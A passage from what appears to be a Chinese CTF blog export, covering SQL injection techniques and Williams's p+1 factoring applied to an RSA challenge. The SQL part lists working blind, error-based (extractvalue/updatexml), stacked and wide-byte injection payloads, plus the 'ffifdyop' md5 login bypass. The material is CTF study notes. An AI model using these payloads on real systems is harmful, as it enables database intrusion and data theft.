ascii(str): str是一个字符串参数，返回值为其最左侧字符的ascii码。通过它，我们才能确定特定的字符。 substr(str,start,len): 这个函数是取str中从下标start开始的，长度为len的字符串。通常在盲注中用于取出单个字符，交给ascii函数来确定其具体的值。 length(str): 这个函数是用来获取str的长度的。这样我们才能知道需要通过substr取到哪个下标。 count([column]): 统计记录的数量，其在盲注中，主要用于判断符合条件的记录的数量，并逐个破解。 if(condition,a,b): 当condition为true的时候，返回a，当condition为false的时候，返回b。 sleep(n): 服务端等待n秒后返回记录, 在时间盲注中, 用于判断语句是否正确. benchmark(times, func): 执行times次func, 也用于时间盲注, 通过服务端的反应时间来判断语句是否正确. 基于布尔的盲注基于布尔的盲注是根据页面差来进行判断注入和数据注入的。在存在注入的页面输入and (true)则返回页面1；输入and (false)则返回页面2，而页面1和页面2有差别，常见的情况页面1是正常页面，页面2是错误页面 注入操作 获取用户名 猜用户名的长度and(select length(user()))=数字, 不断尝试不同的数字得到用户名的长度 逐位猜解用户名and (select ascii(mid(user(),位数,1)))=114, 猜测在某个位置的字母的ASCII码为114. 通过观察返回的页面来判断每一位的字母, 最终得到用户名 获取当前数据库的库名 猜库名长度and (select length(database()))=数字 逐位猜解库名and (select ascii(mid(database(),位数,1)))=116 获取表名 判断表的数量and (select count(table_name) from information_schema.tables where table_schema=database())=4,这条语句就是判断数据库中有4张表 判断表名的长度and (select length(table_name) from information_schema.tables where table_schema=database() limit 位数,1)=5, 位数指的是第几张表 逐位拆解表名and (select ascii(mid(table_name,表名的第几位,1)) from information_schema.tables wheretable_schema=database() limit 第几张表,1)=100 获取列名 判断列的数量and (select count(column_name) form information_schema.columns where table_schema=表名)=数字 判断列的长度and (select length(column_name) form information_schema.columns where table_schema=表名 limit 第几列,1)=数字 逐位猜解列名and (select ascii(mid(column_name,第几个字母,1)) form information_schema.columns where table_schema=表名 limit 第几列,1)=数字 获取数据 判断数据的条数and (select conut(列名) from 表名)=数字 判断数据的长度and (select length(列名) from 表名 limit 第几条,1)=数字 逐位猜解数据and (select ascii(mid(列名,第几个字母,1)) from 表名 limit 第几条,1)=数字 事实上,以上语句中的’=’都可以用’&lt;’和’&gt;’来代替以便于更快的确定数据, 而且手工注入往往需要大量的尝试, 这非常的操蛋繁琐, 一般可以写脚本来注入 基于时间的盲注利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用, 通过页面的响应时间来判断条件是否正确. if(expr1,expr2,expr3)含义是如果expr1是True, 则返回expr2, 否则返回expr3. 注入操作反正也不会真的去手工注入sqlmap即可 报错注入报错注入有很多很多(至少我在网上查找资料的时候看见了很多), 一边做题, 一边把遇到的报错注入的方法进行总结吧.报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中 目录 通过extractvalue()或updatexml()函数 通过extractvalue()或updatexml()函数场景 当union被过滤的时候 原理extractvalue() :对XML文档进行查询的函数udatexml() :对XML文档进行更新的函数语法： extractvalue(文档，路径) updatexml(目标xml文档，xml路径，更新的内容)路径写入其他格式，就会报错并且会返回我们写入的非法格式内容，我们可以利用这个得到我们想得到的内容 常用payload1234查数据库名：id='and(select extractvalue(1,concat(0x7e,(select database()))))爆表名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))))爆字段名：id='and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=\"TABLE_NAME\"))))爆数据：id='and(select extractvalue(1,concat(0x7e,(select group_concat(COIUMN_NAME) from TABLE_NAME)))) 例题: buuctf 极客大挑战 hardsql情景: order by union 空格 and 被过滤查字段名时候的payload:?username=44&amp;password=1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like('H4rDsq1')))))%23 读取文件堆叠注入在正常的语句后面加分号( ; ),可顺序执行多条语句, 从而造成注入漏洞.堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序。 堆叠注入可以搭配一些语句来绕过对某些关键词的过滤:12345;show databases ------列出所有数据库;show tables ------列出所有表;show columns from table_name ------列出某个表的所有字段;desc table_name 通过RENAME更改flag所在表名为默认查询的表名更改表名: rename table tbl_name to new_tbl_namealter table table_name to new name 更改列名 alter table t_app change name app_name varchar(20) 绕过方法宽字节注入利用编码转换, 将服务器端强制添加的本来用于转义的\\符号吃掉, 从而能使攻击者输入的引号起到闭合作用, 以至于可以进行SQL注入. 操作如在进行url?id=1'等操作时, 发现无论如何都不报错, 或者报错了莫名其妙的多出了有\\, 此时就可以使用url?id=1%df', 这时服务端会在’前面添加一个\\, \\的ASCII码为0x5c, 因为前面的%df大于128, 服务端会将0xdf和0x5c合并成0xdf5c即汉字 “运”, 从而达到了绕过\\转义’的目的 PHP预处理使用concat(char(num,num,num)) 即使用ascii码转成字符再拼接来绕过对某些关键词的过滤. SQLite注入与sql不同的是, sqlite少了一些函数, 比如database()等等, 而且如果使用了不存在的函数也无法爆出库名.但是sqlite存在一个sqlite_master表, 里面的字段为type/name/tbl_name/rootpage/sql可以通过查询该表内信息得到表名, 并且可以通过sql字段内的sql语句得到对应表内的字段 一些奇怪的总结???jarvis oj - login这是一道要用万能密码登录的题sql语句是:1\"select * from `admin` where password='\".md5($pass,true).\"'\"php的md5()这个函数, 可以有第二个参数, 如果是true, 则回返回原始的二进制数据, 也就是原本md5出来的32位十六进制字符串转成真正的十六字节的字符串.那么这里要登录进去, 需要把语句构造成:12\"select * from `admin` where password=''or'1'\" # or后面的1可以换成别的, 只要是一个字符串就好了然后这里用到了一个字符串ffifdyop, 为啥用这个呢? 因为如果$pass=ffifdyop, 那么语句就会变成1\"select * from `admin` where password=''or'6'\" 这样就能登录啦","tags":[{"name":"Summary","slug":"Summary","permalink":"http://tearsjin.github.io/tags/Summary/"},{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"SQL","slug":"SQL","permalink":"http://tearsjin.github.io/tags/SQL/"}]},{"title":"Williams's p+1 algorithm","date":"2020-09-26T02:33:58.000Z","path":"2020/09/26/Williams-s-p-1-algorithm/","text":"在计算数论中，Williams的p+1算法是一种整数分解算法，是代数群因子分解算法家族中的一种。它是Hugh C. Williams在1982年发明的。如果要分解的数N包含一个或多个素数因子p，且p+1是光滑的(即p+1只包含小的因子)，那么Williams’s p+1有效。Williams’s p+1使用Lucas序列在二次域中执行求幂运算。 它类似于Pollard的p−1算法。 算法原理选择一个大于2的整数A来计算Lucas序列:其中所有的运算都是模N的 当M是的倍数时，奇素数p整除， 是jacobi symbol 我们要求，即D应该是一个模p的二次的非剩余，但是由于我们不知道p，所以在找到解之前可能需要一个以上的A值。() 如果，则该算法退化为Pollard的p−1算法的慢版本。 因此，对于不同的M值，我们计算 ，当结果不等于1或N时，我们便找到了N的一个非平凡因子。 使用的M值是连续的阶乘，而 是以 为特征的序列的第M个值 为了找到以B为特征的序列的第M个元素V，我们以类似于从左到右求幂的方式进行计算:12345678910x := By := ( B ^ 2 - 2 ) MOD Nfor each bit of M to the right of the most significant bit do if the bit is 1 then x := ( x * y - B ) MOD N y := ( y ^ 2 - 2 ) MOD N else y := ( x ^ y - B ) MOD N x := ( x ^ 2 - 2 ) MOD NV := x 例子令n = 112729，A = 5，求得的的连续值为:1234567V1 of seq(5) = V1! of seq(5) = 5V2 of seq(V1) = V2! of seq(5) = 23V3 of seq(V2) = V3! of seq(5) = 12098V4 of seq(V3) = V4! of seq(5) = 87680V5 of seq(V4) = V5! of seq(5) = 53242V6 of seq(V5) = V6! of seq(5) = 27666V7 of seq(V6) = V7! of seq(5) = 110229此时，，所以139 是112729的一个非平凡素因子。注意到 $p+1 = 140 = 2^2 5 7。而7!$ 是最小的是140的倍数的阶乘数，所以我们找到了一个合适的因子139。 例题 [V&amp;N2020 公开赛]easy_RSA就是因为这题，才会想到Williams’s p+1审计代码发现n = qpr 中三个因子都是p+1光滑的所以想到Williams’s p+1 12345678910111213141516171819202122232425n=7941371739956577280160664419383740967516918938781306610817149744988379280561359039016508679365806108722198157199058807892703837558280678711420411242914059658055366348123106473335186505617418956630780649894945233345985279471106888635177256011468979083320605103256178446993230320443790240285158260236926519042413378204298514714890725325831769281505530787739922007367026883959544239568886349070557272869042275528961483412544495589811933856131557221673534170105409A = [5, 7, 9, 11, 13]def seq(t, base, n): x = 2 y = base i = 0 while True: x, y = y, (base * y - x) % n i += 1 if i == t: return x breakfac = []for v in A: for i in range(1, 5000): v = seq(i, v, n) p = gmpy2.gcd(v - 2, n) print(i,p) if p != 1: fac.append(p) break if len(fac) != 0: break 当程序在A = 5 , i = 2391时就跑出了其中一个因子为1102634610559478918970860957918259981057327949366949344137104804864768237961662136189827166317524151288799657758536256924609797810164397005081733039415393然后用n除以这个因子并对得数继续Williams’s p+1便可以分解出剩下的两个因子 wiki没有中文可真是头大(原理和例子其实就是英文wiki上Williams’s p+1的摘抄+翻译啦","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"Algorithm","slug":"Algorithm","permalink":"http://tearsjin.github.io/tags/Algorithm/"}]}]